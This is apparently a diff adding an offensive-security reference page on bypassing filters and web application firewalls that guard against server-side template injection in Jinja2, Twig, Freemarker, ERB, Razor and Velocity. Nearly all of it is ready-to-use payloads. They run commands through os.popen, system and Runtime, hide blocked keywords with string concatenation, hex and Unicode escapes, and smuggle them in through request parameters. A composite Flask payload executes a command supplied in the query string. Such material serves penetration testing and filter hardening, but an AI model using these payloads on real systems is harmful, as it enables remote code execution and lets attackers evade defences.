@@ -1,0 +1,350 @@
+---
+title: Filter bypass
+description: Defeating keyword and pattern filters in SSTI - string concatenation, encoding tricks, alternate attribute access, and request smuggling for blocked tokens.
+mitre: [T1190, T1027]
+d3fend: [D3-EAL, D3-MA]
+impact: [ServerSideEval]
+sidebar:
+  order: 11
+  label: Filter bypass
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Most SSTI filters work by:
+
+1. Blocking the delimiter (`{{`, `${`, `<%=`)
+2. Blocking specific keywords in the input (`__class__`, `system`, `Runtime`, `popen`)
+3. Stripping bracket / quote / underscore characters
+
+All three are bypassable. The general approach: **reach the same identifier through a different lexical form**. The filter sees the form, not the resolved value.
+
+```
+# Keyword filter: __class__
+{{ ''['__class__'] }}                                # via string indexing
+{{ ''|attr('__class__') }}                          # via attr() filter
+{{ ''[request.args.x] }}                            # via request param
+
+# Keyword filter: system
+{{['id']|filter('sys'~'tem')}}                      # Twig string concat
+@{var s = "sys" + "tem"; ... }                       # Razor string concat
+
+# Delimiter filter: {{
+{%- if 1 %}body{%- endif %}                          # statement-form Jinja2
+```
+
+## Filter taxonomy
+
+Three filter mechanisms, three bypass families:
+
+| Filter does | Bypass approach |
+| --- | --- |
+| Blocks delimiters (`{{`, `${`, `<%`) | Use alternate syntax (statement blocks, attribute-based delimiters) |
+| Blocks specific keywords | Reach the same object through a different name - string concat, indexing, encoding |
+| Strips characters | Reconstruct via the engine's string operations |
+
+## Bypass 1 - Delimiter alternatives
+
+When the obvious delimiter is blocked, every engine has alternates:
+
+<Tabs>
+  <TabItem label="Jinja2">
+
+```
+{{ expression }}                             # standard
+{%- expression -%}                           # statement (works for control flow + side effects)
+{# comment #}                                # comment - sometimes useful as a presence probe
+
+# Inside expression context
+{{ "raw"|safe }}                             # filter chains
+
+# When {{ is filtered but tag-like input is rendered
+{% if 1 %}{{leak_via_other_path}}{% endif %}
+```
+
+  </TabItem>
+  <TabItem label="Twig">
+
+```
+{{ expression }}                             # standard
+{%- expression -%}                           # statement
+{# comment #}                                # comment
+```
+
+Twig and Jinja2 share delimiter syntax - same bypass paths work.
+
+  </TabItem>
+  <TabItem label="Freemarker">
+
+```
+${expression}                                # standard
+<#if 1>body</#if>                           # directive-style - distinct delimiter family
+<@somemacro/>                                # macro invocation
+[#if 1]body[/#if]                           # alternate "square bracket" syntax (configurable)
+```
+
+If `${` is filtered, the `<#...>` or `[#...]` paths are entirely different lexical forms.
+
+  </TabItem>
+  <TabItem label="ERB">
+
+```
+<%= expression %>                            # output-producing
+<% statement %>                              # no output
+<%- statement -%>                            # whitespace-trimming variant
+<%# comment %>                               # comment
+```
+
+If `<%=` is filtered specifically, `<% expression; print(result) %>` reaches the same path with different lexical structure.
+
+  </TabItem>
+  <TabItem label="Razor">
+
+```
+@expression                                  # inline
+@(expression)                                # explicit
+@{ code; }                                   # code block (no output)
+@:text                                       # literal text mode
+@@                                           # escaped @ - for outputting literal @
+```
+
+Razor's `@` is unusually hard to filter cleanly because it's a single character with many surrounding contexts.
+
+  </TabItem>
+</Tabs>
+
+## Bypass 2 - Keyword reaching via alternate name
+
+The most common filter: block specific identifier strings (`__class__`, `system`, `Runtime`). The same identifier can be reached via:
+
+### String indexing instead of attribute access (Python / PHP)
+
+```
+# Jinja2 - instead of {{''.__class__}}
+{{ ''['__class__'] }}
+{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
+
+# Twig - same pattern works
+{{ _self['env']['registerUndefinedFilterCallback']('exec') }}
+```
+
+The dot-access path goes through `__getattr__`; bracket-access goes through `__getitem__`. Filters that hook one don't always hook the other.
+
+### String concatenation in callable names
+
+```
+# Twig - instead of filter('system')
+{{['id']|filter('sys'~'tem')}}
+{{['id']|filter('sy'~'st'~'em')}}
+
+# ERB - Ruby string concat
+<%= `id`.send('to'+'_s') %>
+
+# Razor - C# string concat at compile time
+@{ var t = System.Type.GetType("System.Diag"+"nostics.Process"); /* ... */ }
+
+# Velocity - assemble class name in fragments
+#set($cls=$s.getClass().forName("java.lang."+"Run"+"time"))
+```
+
+The filter scans the raw template source for `'system'`; the runtime sees the concatenated string. Regex-based filters miss this almost universally.
+
+### Unicode / hex / escape sequences
+
+```
+# Jinja2 - hex in attribute name
+{{ ''['\x5f\x5fclass\x5f\x5f'] }}            # \x5f = _
+
+# Twig - same trick
+{{['id']|filter('\x73ystem')}}               # \x73 = s
+
+# Freemarker - Java-style Unicode
+<#assign ex="\u0066reemarker.template.utility.Execute"?new()>${ex("id")}
+
+# Razor - Unicode escapes in identifiers (C# supports them)
+@System.Diagnostics.\u0050rocess.Start("cmd", "/c id")
+
+# ERB - Ruby \u and \x escapes
+<%= `\x69\x64` %>                            # \x69\x64 = "id"
+```
+
+### Request parameter smuggling
+
+When the template body itself can't contain the blocked keyword:
+
+```
+# Jinja2 - Flask/Werkzeug
+{{ ''[request.args.x][request.args.y][1][request.args.z]() }}
+# Then submit ?x=__class__&y=__mro__&z=__subclasses__
+
+# Same pattern works in Twig via app.request.query
+{{ ''[app.request.query.get('x')][app.request.query.get('y')](...) }}
+
+# ERB - Ruby reads params from a Rails request
+<%= ''.send(params[:method]) %>
+```
+
+The keyword never appears in the template body - it arrives over the wire in a separate field.
+
+### Alternative entry points to the same class
+
+```
+# Jinja2 - Flask globals
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+{{ lipsum.__globals__['os'].popen('id').read() }}
+
+# Velocity - different reflection entry
+#set($r=$s.getClass().getSuperclass())       # rather than the Runtime path
+```
+
+Filters that hook the most common path miss the less common one.
+
+## Bypass 3 - Character stripping reconstruction
+
+When specific characters (quotes, parens, dots) are stripped:
+
+### Quotes stripped
+
+```
+# Jinja2 - chr() to construct strings
+{{ ((((lipsum|attr('\x5f\x5fglobals\x5f\x5f'))|attr('\x5f\x5fgetitem\x5f\x5f'))(chr(111)*0+chr(115)))... }}
+
+# Use request.args to deliver quoted strings
+{{ ''[request.args.x] }}                     # ?x=...
+```
+
+### Dots stripped (attribute access)
+
+```
+# Jinja2 - pure bracket access
+{{ (((((lipsum|attr('__init__'))|attr('__globals__'))|attr('__getitem__'))('os'))|attr('popen'))('id') }}
+```
+
+Verbose but reaches the same target without a single `.` in the template.
+
+### Parens stripped
+
+```
+# Twig - call methods via |filter pipe syntax
+{{['id']|filter('system')}}                  # |filter() syntax doesn't strictly require ()
+
+# Jinja2 - same
+{{ ''|attr('__class__') }}                   # |attr does the call
+```
+
+The pipe syntax `|name(arg)` is parsed as a method call by the engine without requiring `()` in the user-visible source.
+
+## Bypass 4 - WAF-specific tricks
+
+Generic Web Application Firewalls intercept SSTI by pattern-matching common payloads. Beyond the per-engine bypasses above:
+
+### Whitespace insertion
+
+```
+{{ 7 * 7 }}                                  # works (engines tolerate whitespace)
+{{   7    *    7   }}                        # extra whitespace
+{{ 7	*	7 }}                                # tabs (often less filtered)
+{{
+7
+*
+7
+}}                                            # newlines
+```
+
+Many regex-based WAF rules don't account for arbitrary whitespace.
+
+### Comment-fenced probes
+
+```
+{{/*comment*/7*7}}                           # Jinja2/Twig don't parse this, but it can confuse filters
+{{7/*comment*/*7}}                           # if the engine allows mid-expression comments
+```
+
+### Mixed encoding
+
+```
+# URL-encode part of the payload
+%7B%7B7*7%7D%7D
+# HTML-entity encode
+&#x7b;&#x7b;7*7&#x7d;&#x7d;
+# Mixed
+%7B{7*7}%7D
+```
+
+When the application URL-decodes once but the WAF doesn't, mixed encoding survives.
+
+### Case manipulation (XML-context engines)
+
+For engines that are case-insensitive in directive parsing (rare but present in some XSLT/XML-based templates):
+
+```
+<#IF 1>${7*7}</#IF>                          # uppercase directive
+<#If 1>${7*7}</#If>                          # mixed case
+```
+
+## Bypass 5 - Output channel diversion
+
+When direct reflection is filtered (the response is sanitized), reach an alternate output channel:
+
+- **Email body** - submit probe in a "name" field, trigger an email send, read the email
+- **PDF / report** - submit probe in a field included in a generated report, download the report
+- **Webhook payload** - submit probe in a field that becomes part of an outgoing HTTP request, inspect the destination
+- **Admin notification** - submit probe in user-facing content, trigger an admin notification, read it
+- **Logs** - submit probe in a field that gets logged, read logs through any path that surfaces them
+
+The same filter rarely applies to all output channels. A WAF that strips `<%= ... %>` from HTML responses often passes the same payload through unchanged in JSON / email / PDF.
+
+## Composite bypass example
+
+A real-world payload combining multiple techniques. Target: Flask app with WAF blocking `__class__`, `__import__`, and the literal `subprocess`:
+
+```
+{{
+  request.application.application.__self__.\
+  _get_data_for_json.__globals__\
+  ['__buil'+'tins__']\
+  ['__imp'+'ort__']('os').popen(request.args.cmd).read()
+}}
+```
+
+Then `?cmd=id`:
+
+- `__class__` not in payload (reached via `__globals__`)
+- `__import__` split with concatenation
+- `subprocess` not used (uses `os.popen` instead)
+- The command itself comes from `request.args.cmd`, not the template
+
+## Bypass diagnostic - what's the filter doing?
+
+If you suspect a filter is blocking payloads, identify what it's actually doing before generalizing:
+
+```
+{{7*7}}                                      # → ?
+{{7 * 7}}                                    # → ?  (whitespace test)
+{{ 7*7 }}                                    # → ?  (whitespace inside delim)
+{{ x }}                                      # → ?  (undefined variable - does the engine even try?)
+{{}}                                         # → ?  (empty expression)
+{{                                           # → ?  (incomplete - does the parser see it?)
+xxx{{7*7}}xxx                                # → ?  (surrounded by markers - is the marker preserved?)
+```
+
+The response pattern reveals what's being filtered:
+
+- All return the input unchanged → engine isn't running, or the input never reaches it
+- Some return `49` and some don't → specific patterns are filtered
+- All produce errors → engine sees the input but rejects it
+- `xxx{{7*7}}xxx` returns `xxxxxx` (markers preserved, payload stripped) → string-level filter removing payloads
+- `xxx{{7*7}}xxx` returns `xxx49xxx` → no filter, just template engine working normally
+
+## Notes
+
+- **Filter quality varies wildly.** A `replace('{{', '')` filter is trivially bypassed; a proper AST-walking template policy enforced by Twig's SecurityPolicy is genuinely hard to defeat. Most filters in the wild are the former.
+- **Composability matters.** Combining two bypasses (string concat + alternate entry) often defeats filters that catch either alone. When a single-technique bypass fails, try stacking.
+- **The "stripped" case is informative.** When a filter removes part of your payload silently, the resulting partial payload often produces a useful error message that reveals what the engine sees vs. what you sent.
+
+<Aside type="tip">
+The most useful single principle for filter bypass: **the filter is reading code; the engine is reading data**. Anything you can express as data (a string argument, a request parameter, a variable lookup) often escapes filters that focus on code keywords.
+</Aside>
